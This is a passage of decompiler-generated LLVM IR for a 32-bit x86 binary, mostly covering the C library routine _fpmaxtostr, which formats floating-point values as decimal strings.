  uselistorder i32 %v2_804f583, { 1, 0 }
  uselistorder i32 %v0_804f56c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804f568, { 1, 0, 2 }
  uselistorder i32 %v0_804f59b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804f544, { 1, 0 }
  uselistorder i32 %v0_804f53f, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 255, { 1, 0, 5, 2, 3, 4, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f5c5, { 1, 0 }
  uselistorder label %dec_label_pc_804f5b2, { 1, 0 }
  uselistorder label %dec_label_pc_804f5a3, { 1, 0 }
  uselistorder label %dec_label_pc_804f55e, { 1, 0 }
  uselistorder label %dec_label_pc_804f53a, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f5d1 = load i32, i32* @edi, align 4
  %v0_804f5d2 = load i32, i32* @esi, align 4
  %v0_804f5d3 = load i32, i32* @ebx, align 4
  store i32 %v0_804f5d3, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_804f5e8 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804f5e8 = add i3 %v4_804f5e8, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_804f5e8, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f5ef = add i32 %tmp156, 4
  %v2_804f5ef = inttoptr i32 %v1_804f5ef to i32*
  %v3_804f5ef = load i32, i32* %v2_804f5ef, align 4
  store i32 %v3_804f5ef, i32* %eax.global-to-local, align 4
  %v1_804f5f6 = add i32 %tmp156, 8
  %v2_804f5f6 = inttoptr i32 %v1_804f5f6 to i8*
  %v3_804f5f6 = load i8, i8* %v2_804f5f6, align 1
  %v4_804f5f6 = zext i8 %v3_804f5f6 to i32
  %v6_804f5f6 = and i32 %v0_804f5d3, -256
  %v7_804f5f6 = or i32 %v4_804f5f6, %v6_804f5f6
  store i32 %v7_804f5f6, i32* %ebx.global-to-local, align 4
  %v1_804f5f9 = inttoptr i32 %tmp156 to i32*
  %v2_804f5f9 = load i32, i32* %v1_804f5f9, align 4
  store i32 %v2_804f5f9, i32* %ebp.global-to-local, align 4
  %v2_804f605 = or i8 %v3_804f5f6, 32
  %v7_804f605 = zext i8 %v2_804f605 to i32
  %v9_804f605 = and i32 %v3_804f5ef, -256
  %v10_804f605 = or i32 %v7_804f605, %v9_804f605
  store i32 %v10_804f605, i32* %eax.global-to-local, align 4
  %v10_804f607 = icmp eq i8 %v2_804f605, 97
  %v1_804f60d = icmp eq i1 %v10_804f607, false
  br i1 %v1_804f60d, label %dec_label_pc_804f616, label %dec_label_pc_804f60f

dec_label_pc_804f60f:                             ; preds = %entry
  %v2_804f60f = add i8 %v3_804f5f6, 6
  %v15_804f60f = zext i8 %v2_804f60f to i32
  %v18_804f60f = or i32 %v15_804f60f, %v6_804f5f6
  store i32 %v18_804f60f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f616

dec_label_pc_804f616:                             ; preds = %entry, %dec_label_pc_804f60f
  %stack_var_-207.0 = phi i8 [ %v3_804f5f6, %entry ], [ %v2_804f60f, %dec_label_pc_804f60f ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_804f61d = icmp slt i32 %v2_804f5f9, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_804f62c = select i1 %v2_804f61d, i32 6, i32 %v2_804f5f9
  store i32 %v3_804f62c, i32* %ebp.global-to-local, align 4
  %v1_804f62f = add i32 %tmp156, 12
  %v2_804f62f = inttoptr i32 %v1_804f62f to i32*
  %v3_804f62f = load i32, i32* %v2_804f62f, align 4
  store i32 %v3_804f62f, i32* %eax.global-to-local, align 4
  %v2_804f632 = and i32 %v3_804f62f, 2
  %v3_804f632 = icmp eq i32 %v2_804f632, 0
  br i1 %v3_804f632, label %dec_label_pc_804f640, label %dec_label_pc_804f64c

dec_label_pc_804f640:                             ; preds = %dec_label_pc_804f616
  %v2_804f640 = urem i32 %v3_804f62f, 2
  %tmp192 = trunc i32 %v2_804f640 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_804f64c

dec_label_pc_804f64c:                             ; preds = %dec_label_pc_804f640, %dec_label_pc_804f616
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804f616 ], [ %tmp193, %dec_label_pc_804f640 ]
  %not.v5_804f64c = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_804f64c, label %dec_label_pc_804f6c3, label %dec_label_pc_804f66e

dec_label_pc_804f66e:                             ; preds = %dec_label_pc_804f64c
  %v1_804f66e = add i3 %v4_804f5e8, -2
  store i3 %v1_804f66e, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_804f672 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_804f672, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_804f66e
  br label %dec_label_pc_804f6fe

bb180:                                            ; preds = %dec_label_pc_804f66e
  %v5_804f672 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_804f672, label %bb181, label %dec_label_pc_804f676

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_804f6fe

dec_label_pc_804f676:                             ; preds = %bb180
  %not.v4_804f670 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_804f670, label %dec_label_pc_804f6fe, label %dec_label_pc_804f793

dec_label_pc_804f6c3:                             ; preds = %dec_label_pc_804f64c
  store i3 %v4_804f5e8, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_804f6ca = add i32 %tmp156, 16
  %v2_804f6ca = inttoptr i32 %v1_804f6ca to i32*
  store i32 32, i32* %v2_804f6ca, align 4
  %v4_804f6d1 = add i8 %stack_var_-207.0, -96
  %v6_804f6d1 = sub i8 95, %stack_var_-207.0
  %v7_804f6d1 = and i8 %v6_804f6d1, %stack_var_-207.0
  %v8_804f6d1 = icmp slt i8 %v7_804f6d1, 0
  %v9_804f6d1 = icmp eq i8 %v4_804f6d1, 0
  %v10_804f6d1 = icmp slt i8 %v4_804f6d1, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_804f6e6 = icmp eq i1 %v10_804f6d1, %v8_804f6d1
  %v4_804f6e6 = icmp eq i1 %v9_804f6d1, false
  %v5_804f6e6 = and i1 %v4_804f6e6, %v3_804f6e6
  br i1 %v5_804f6e6, label %dec_label_pc_804f6ed, label %dec_label_pc_804f6e8

dec_label_pc_804f6e8:                             ; preds = %dec_label_pc_804f6c3
  br label %dec_label_pc_804f6ed

dec_label_pc_804f6ed:                             ; preds = %dec_label_pc_804f6c3, %dec_label_pc_804f6e8
  %v2_804f6f5 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f6f5, i32* @ecx, align 4
  br label %dec_label_pc_804fabe

dec_label_pc_804f6fe:                             ; preds = %dec_label_pc_804f676, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_804f718 = xor i3 %v4_804f5e8, -4
  store i3 %v3_804f718, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804f71e

dec_label_pc_804f71e:                             ; preds = %dec_label_pc_804f76f, %dec_label_pc_804f6fe
  %v0_804f76f = phi i32 [ 4096, %dec_label_pc_804f6fe ], [ %v2_804f76f, %dec_label_pc_804f76f ]
  %v2_804f721 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804f6fe ], [ %v2_804f72181, %dec_label_pc_804f76f ]
  %v1_804f759 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804f6fe ], [ %v0_804f71e79, %dec_label_pc_804f76f ]
  %v0_804f76b66 = phi i32 [ 13, %dec_label_pc_804f6fe ], [ %v1_804f720, %dec_label_pc_804f76f ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_804f6fe ], [ %stack_var_-220.1, %dec_label_pc_804f76f ]
  %v1_804f720 = add i32 %v0_804f76b66, -1
  %v4_804f721 = fcmp ule x86_fp80 %v1_804f759, %v2_804f721
  br i1 %v4_804f721, label %dec_label_pc_804f748, label %dec_label_pc_804f725

dec_label_pc_804f725:                             ; preds = %dec_label_pc_804f71e
  store x86_fp80 %v1_804f759, x86_fp80* %st0.global-to-local, align 4
  %v3_804f727 = mul i32 %v1_804f720, 12
  store i32 %v3_804f727, i32* %eax.global-to-local, align 4
  %v1_804f72a = add i32 %v3_804f727, ptrtoint (x86_fp80** @global_var_80517e0.130 to i32)
  %v2_804f72a = inttoptr i32 %v1_804f72a to x86_fp80*
  %v3_804f72a = load x86_fp80, x86_fp80* %v2_804f72a, align 4
  %v4_804f730 = fmul x86_fp80 %v1_804f759, %v3_804f72a
  store x86_fp80 %v4_804f730, x86_fp80* %st1.global-to-local, align 4
  %v4_804f734 = fcmp ule x86_fp80 %v4_804f730, %v3_804f72a
  br i1 %v4_804f734, label %dec_label_pc_804f769, label %dec_label_pc_804f738

dec_label_pc_804f738:                             ; preds = %dec_label_pc_804f725
  store x86_fp80 %v4_804f730, x86_fp80* %st1.global-to-local, align 4
  %v5_804f742 = sub i32 %stack_var_-220.0, %v0_804f76f
  br label %dec_label_pc_804f76b

dec_label_pc_804f748:                             ; preds = %dec_label_pc_804f71e
  %v3_804f748 = mul i32 %v1_804f720, 12
  store i32 %v3_804f748, i32* %eax.global-to-local, align 4
  %v1_804f74b = add i32 %v3_804f748, ptrtoint (x86_fp80** @global_var_80517e0.130 to i32)
  %v2_804f74b = inttoptr i32 %v1_804f74b to x86_fp80*
  %v3_804f74b = load x86_fp80, x86_fp80* %v2_804f74b, align 4
  %v4_804f751 = fdiv x86_fp80 %v3_804f74b, %v1_804f759
  store x86_fp80 %v4_804f751, x86_fp80* %st1.global-to-local, align 4
  %v4_804f753 = fcmp ogt x86_fp80 %v3_804f74b, %v1_804f759
  br i1 %v4_804f753, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_804f748
  store x86_fp80 %v3_804f74b, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804f759

bb183:                                            ; preds = %dec_label_pc_804f748
  %v5_804f753 = fcmp olt x86_fp80 %v3_804f74b, %v1_804f759
  br i1 %v5_804f753, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_804f74b, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804f769

bb184:                                            ; preds = %bb183
  %not.v6_804f753 = fcmp une x86_fp80 %v3_804f74b, %v1_804f759
  store x86_fp80 %v3_804f74b, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_804f753, label %dec_label_pc_804f769, label %dec_label_pc_804f759

dec_label_pc_804f759:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_804f74b, x86_fp80* %st1.global-to-local, align 4
  %v5_804f763 = add i32 %stack_var_-220.0, %v0_804f76f
  br label %dec_label_pc_804f76b

dec_label_pc_804f769:                             ; preds = %dec_label_pc_804f725, %.thread51, %bb184
  %v1_804f769 = phi x86_fp80 [ %v1_804f759, %.thread51 ], [ %v1_804f759, %bb184 ], [ %v3_804f72a, %dec_label_pc_804f725 ]
  %v0_804f71e80 = phi x86_fp80 [ %v3_804f74b, %.thread51 ], [ %v3_804f74b, %bb184 ], [ %v4_804f730, %dec_label_pc_804f725 ]
  store x86_fp80 %v1_804f769, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f76b

dec_label_pc_804f76b:                             ; preds = %dec_label_pc_804f759, %dec_label_pc_804f738, %dec_label_pc_804f769
  %v2_804f72181 = phi x86_fp80 [ %v1_804f769, %dec_label_pc_804f769 ], [ %v2_804f721, %dec_label_pc_804f759 ], [ %v1_804f759, %dec_label_pc_804f738 ]
  %v0_804f71e79 = phi x86_fp80 [ %v0_804f71e80, %dec_label_pc_804f769 ], [ %v3_804f74b, %dec_label_pc_804f759 ], [ %v4_804f730, %dec_label_pc_804f738 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_804f769 ], [ %v5_804f763, %dec_label_pc_804f759 ], [ %v5_804f742, %dec_label_pc_804f738 ]
  %v1_804f76b = icmp eq i32 %v1_804f720, 0
  br i1 %v1_804f76b, label %.thread60, label %dec_label_pc_804f76f

dec_label_pc_804f76f:                             ; preds = %dec_label_pc_804f76b
  %v2_804f76f = sdiv i32 %v0_804f76f, 2
  store i32 %v2_804f76f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f71e

.thread60:                                        ; preds = %dec_label_pc_804f76b
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804f793

dec_label_pc_804f793:                             ; preds = %dec_label_pc_804f676, %.thread60
  %v0_804f84d = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_804f676 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_804f676 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_804f797 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804f66e, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_804f7aa = and i32 %v2_804f797, -65536
  %v1_804f7af = udiv i16 %tmp146, 256
  %v2_804f7af = zext i16 %v1_804f7af to i32
  %v3_804f7af = or i32 %v2_804f7af, 12
  %v10_804f7af = mul nuw nsw i32 %v3_804f7af, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_804f7aa.masked = zext i16 %tmp194 to i32
  %v11_804f7af = or i32 %v10_804f7af, %v4_804f7aa.masked
  %v12_804f7af = or i32 %v11_804f7af, %v6_804f7aa
  store i32 %v12_804f7af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f7b7

dec_label_pc_804f7b7:                             ; preds = %dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge, %dec_label_pc_804f793
  %v2_804f7dc = phi x86_fp80 [ %storemerge, %dec_label_pc_804f793 ], [ %v2_804f7dc.pre, %dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge ]
  %v1_804f7b7 = phi i3 [ %v1_804f66e, %dec_label_pc_804f793 ], [ %v1_804f7b7.pre, %dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge ]
  %v3_804f7de = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804f793 ], [ %v0_804f7b7.pre, %dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804f797, %dec_label_pc_804f793 ], [ %v4_804f7d7, %dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_804f7de to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_804f7d1 = sitofp i32 %tmp195 to x86_fp80
  %v4_804f7d7 = add i32 %stack_var_-212.0, 9
  %v4_804f7dc = fsub x86_fp80 %v2_804f7dc, %v5_804f7d1
  store i3 %v1_804f7b7, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f7de = fmul x86_fp80 %v3_804f7de, %v4_804f7dc
  store x86_fp80 %v4_804f7de, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f7e0

dec_label_pc_804f7e0:                             ; preds = %dec_label_pc_804f7e0.dec_label_pc_804f7e0_crit_edge, %dec_label_pc_804f7b7
  %v0_804f7f4 = phi i32 [ %v0_804f7f4.pre, %dec_label_pc_804f7e0.dec_label_pc_804f7e0_crit_edge ], [ %tmp195, %dec_label_pc_804f7b7 ]
  %v0_804f7e4 = phi i32 [ %v0_804f7e4.pre, %dec_label_pc_804f7e0.dec_label_pc_804f7e0_crit_edge ], [ 0, %dec_label_pc_804f7b7 ]
  %v1_804f7e4 = add i32 %v0_804f7e4, 1
  store i32 %v1_804f7e4, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_804f7ee = sub i32 %v4_804f7d7, %v1_804f7e4
  %div = udiv i32 %v0_804f7f4, 10
  %tmp185 = urem i32 %v0_804f7f4, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_804f7fa = and i32 %div, 536870656
  store i32 %v2_804f7ee, i32* %edx.global-to-local, align 4
  %v1_804f800 = trunc i32 %tmp185 to i8
  %v2_804f800 = or i8 %v1_804f800, 48
  %v12_804f800 = zext i8 %v2_804f800 to i32
  %v15_804f800 = or i32 %v12_804f800, %v3_804f7fa
  store i32 %v15_804f800, i32* %eax.global-to-local, align 4
  %v3_804f805 = inttoptr i32 %v2_804f7ee to i8*
  store i8 %v2_804f800, i8* %v3_804f805, align 1
  %v7_804f807 = icmp sgt i32 %v1_804f7e4, 8
  br i1 %v7_804f807, label %dec_label_pc_804f809, label %dec_label_pc_804f7e0.dec_label_pc_804f7e0_crit_edge

dec_label_pc_804f7e0.dec_label_pc_804f7e0_crit_edge: ; preds = %dec_label_pc_804f7e0
  %v0_804f7e4.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804f7f4.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f7e0

dec_label_pc_804f809:                             ; preds = %dec_label_pc_804f7e0
  %v0_804f809 = load i32, i32* @edi, align 4
  %v1_804f809 = add i32 %v0_804f809, 1
  store i32 %v1_804f809, i32* @edi, align 4
  %v7_804f80d = icmp sgt i32 %v1_804f809, 2
  br i1 %v7_804f80d, label %dec_label_pc_804f80f, label %dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge

dec_label_pc_804f809.dec_label_pc_804f7b7_crit_edge: ; preds = %dec_label_pc_804f809
  %v0_804f7b7.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804f7b7.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804f7dc.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f7b7

dec_label_pc_804f80f:                             ; preds = %dec_label_pc_804f809
  %v0_804f80f = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f80f = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804f80f, x86_fp80* %st0.global-to-local, align 4
  %v2_804f811 = add i3 %v0_804f80f, 2
  store i3 %v2_804f811, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f813 = add i8 %stack_var_-207.0, -96
  %v6_804f813 = sub i8 95, %stack_var_-207.0
  %v7_804f813 = and i8 %v6_804f813, %stack_var_-207.0
  %v8_804f813 = icmp slt i8 %v7_804f813, 0
  %v9_804f813 = icmp eq i8 %v4_804f813, 0
  %v10_804f813 = icmp slt i8 %v4_804f813, 0
  %v3_804f818 = icmp eq i1 %v10_804f813, %v8_804f813
  %v4_804f818 = icmp eq i1 %v9_804f813, false
  %v5_804f818 = and i1 %v4_804f818, %v3_804f818
  br i1 %v5_804f818, label %dec_label_pc_804f827, label %dec_label_pc_804f81a

dec_label_pc_804f81a:                             ; preds = %dec_label_pc_804f80f
  %v4_804f81a = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_804f827

dec_label_pc_804f827:                             ; preds = %dec_label_pc_804f80f, %dec_label_pc_804f81a
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_804f80f ], [ %v4_804f81a, %dec_label_pc_804f81a ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804f80f ], [ 69, %dec_label_pc_804f81a ]
  %v12_804f827 = icmp eq i8 %stack_var_-207.1, 103
  %v1_804f82c = icmp eq i1 %v12_804f827, false
  br i1 %v1_804f82c, label %dec_label_pc_804f835, label %dec_label_pc_804f82e

dec_label_pc_804f82e:                             ; preds = %dec_label_pc_804f827
  %v0_804f82e = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_804f82e, 1
  br i1 %tmp186, label %dec_label_pc_804f83c, label %dec_label_pc_804f832

dec_label_pc_804f832:                             ; preds = %dec_label_pc_804f82e
  %v1_804f832 = add i32 %v0_804f82e, -1
  store i32 %v1_804f832, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f83c

dec_label_pc_804f835:                             ; preds = %dec_label_pc_804f827
  %v12_804f835 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_804f835, label %dec_label_pc_804f840, label %dec_label_pc_804f835.dec_label_pc_804f83c_crit_edge

dec_label_pc_804f835.dec_label_pc_804f83c_crit_edge: ; preds = %dec_label_pc_804f835
  %v0_804f83c.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f83c

dec_label_pc_804f83c:                             ; preds = %dec_label_pc_804f835.dec_label_pc_804f83c_crit_edge, %dec_label_pc_804f82e, %dec_label_pc_804f832
  %v0_804f83c = phi i32 [ %v0_804f83c.pre, %dec_label_pc_804f835.dec_label_pc_804f83c_crit_edge ], [ %v0_804f82e, %dec_label_pc_804f82e ], [ %v1_804f832, %dec_label_pc_804f832 ]
  store i32 %v0_804f83c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f86d

dec_label_pc_804f840:                             ; preds = %dec_label_pc_804f835
  store i32 %v0_804f84d, i32* %eax.global-to-local, align 4
  %v0_804f844 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f844 = add i32 %v0_804f844, %v0_804f84d
  store i32 %v2_804f844, i32* %ebx.global-to-local, align 4
  %v5_804f84b = icmp slt i32 %v2_804f844, -1
  br i1 %v5_804f84b, label %dec_label_pc_804f84d, label %dec_label_pc_804f86d

dec_label_pc_804f84d:                             ; preds = %dec_label_pc_804f840
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f855 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804f855, i32* %eax.global-to-local, align 4
  %v4_804f85d = bitcast i32* %stack_var_-72 to i8*
  %v5_804f85d = call i32 @__GI_memset(i8* %v4_804f85d, i32 48, i32 21)
  store i32 %v5_804f85d, i32* %eax.global-to-local, align 4
  %v0_804f86d.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f86d

dec_label_pc_804f86d:                             ; preds = %dec_label_pc_804f840, %dec_label_pc_804f84d, %dec_label_pc_804f83c
  %v1_804f88d = phi i32 [ %v0_804f83c, %dec_label_pc_804f83c ], [ %v2_804f844, %dec_label_pc_804f840 ], [ %v0_804f86d.pr.pre, %dec_label_pc_804f84d ]
  %stack_var_-220.3 = phi i32 [ %v0_804f84d, %dec_label_pc_804f83c ], [ %v0_804f84d, %dec_label_pc_804f840 ], [ -1, %dec_label_pc_804f84d ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804f880 = icmp sgt i32 %v1_804f88d, 20
  br i1 %v7_804f880, label %dec_label_pc_804f882, label %dec_label_pc_804f88d

dec_label_pc_804f882:                             ; preds = %dec_label_pc_804f86d
  %v2_804f882 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804f882, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f8a1.preheader

dec_label_pc_804f88d:                             ; preds = %dec_label_pc_804f86d
  %v0_804f88d = load i32, i32* @esp, align 4
  %v2_804f88d = add i32 %v1_804f88d, 165
  %v3_804f88d = add i32 %v2_804f88d, %v0_804f88d
  store i32 %v3_804f88d, i32* %eax.global-to-local, align 4
  %v1_804f894 = add i32 %v3_804f88d, 2
  %v2_804f894 = inttoptr i32 %v1_804f894 to i8*
  %v3_804f894 = load i8, i8* %v2_804f894, align 1
  %v4_804f894 = add i8 %v3_804f894, -53
  %v9_804f894 = sub i8 52, %v3_804f894
  %v10_804f894 = and i8 %v9_804f894, %v3_804f894
  %v11_804f894 = icmp slt i8 %v10_804f894, 0
  %v13_804f894 = icmp slt i8 %v4_804f894, 0
  store i32 %v1_804f894, i32* %ecx.global-to-local, align 4
  %v2_804f89b = icmp eq i1 %v13_804f894, %v11_804f894
  %v3_804f89b = zext i1 %v2_804f89b to i32
  br label %dec_label_pc_804f8a1.preheader

dec_label_pc_804f8a1.preheader:                   ; preds = %dec_label_pc_804f88d, %dec_label_pc_804f882
  %v0_804f8a1102 = phi i32 [ %v1_804f894, %dec_label_pc_804f88d ], [ %v2_804f882, %dec_label_pc_804f882 ]
  %storemerge71 = phi i32 [ %v3_804f89b, %dec_label_pc_804f88d ], [ 0, %dec_label_pc_804f882 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8a1

dec_label_pc_804f8a1:                             ; preds = %dec_label_pc_804f8a1.backedge, %dec_label_pc_804f8a1.preheader
  %v3_804f8a2 = phi i32 [ %v3_804f8a2.pre, %dec_label_pc_804f8a1.backedge ], [ %storemerge71, %dec_label_pc_804f8a1.preheader ]
  %v0_804f8a1 = phi i32 [ %v0_804f8a4, %dec_label_pc_804f8a1.backedge ], [ %v0_804f8a1102, %dec_label_pc_804f8a1.preheader ]
  %v1_804f8a1 = add i32 %v0_804f8a1, -1
  store i32 %v1_804f8a1, i32* %ecx.global-to-local, align 4
  %v1_804f8a2 = inttoptr i32 %v1_804f8a1 to i8*
  %v2_804f8a2 = load i8, i8* %v1_804f8a2, align 1
  %v4_804f8a2 = trunc i32 %v3_804f8a2 to i8
  %v5_804f8a2 = add i8 %v2_804f8a2, %v4_804f8a2
  store i8 %v5_804f8a2, i8* %v1_804f8a2, align 1
  %v0_804f8a4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f8a4 = inttoptr i32 %v0_804f8a4 to i8*
  %v2_804f8a4 = load i8, i8* %v1_804f8a4, align 1
  %v3_804f8a4 = zext i8 %v2_804f8a4 to i32
  %v4_804f8a4 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f8a4 = and i32 %v4_804f8a4, -256
  %v6_804f8a4 = or i32 %v5_804f8a4, %v3_804f8a4
  store i32 %v6_804f8a4, i32* %edx.global-to-local, align 4
  %v7_804f8a6 = icmp eq i8 %v2_804f8a4, 48
  br i1 %v7_804f8a6, label %dec_label_pc_804f8a1.backedge, label %dec_label_pc_804f8ab

dec_label_pc_804f8a1.backedge:                    ; preds = %dec_label_pc_804f8a1, %dec_label_pc_804f8ab
  %v3_804f8a2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8a1

dec_label_pc_804f8ab:                             ; preds = %dec_label_pc_804f8a1
  %v2_804f8ab = add i8 %v2_804f8a4, -57
  %v7_804f8ab = sub i8 56, %v2_804f8a4
  %v8_804f8ab = and i8 %v7_804f8ab, %v2_804f8a4
  %v9_804f8ab = icmp slt i8 %v8_804f8ab, 0
  %v10_804f8ab = icmp eq i8 %v2_804f8ab, 0
  %v11_804f8ab = icmp slt i8 %v2_804f8ab, 0
  %v3_804f8ae = icmp eq i1 %v11_804f8ab, %v9_804f8ab
  %v4_804f8ae = icmp eq i1 %v10_804f8ab, false
  %v5_804f8ae = and i1 %v4_804f8ae, %v3_804f8ae
  br i1 %v5_804f8ae, label %dec_label_pc_804f8a1.backedge, label %dec_label_pc_804f8b0

dec_label_pc_804f8b0:                             ; preds = %dec_label_pc_804f8ab
  %v2_804f8b0 = ptrtoint i32* %stack_var_-71 to i32
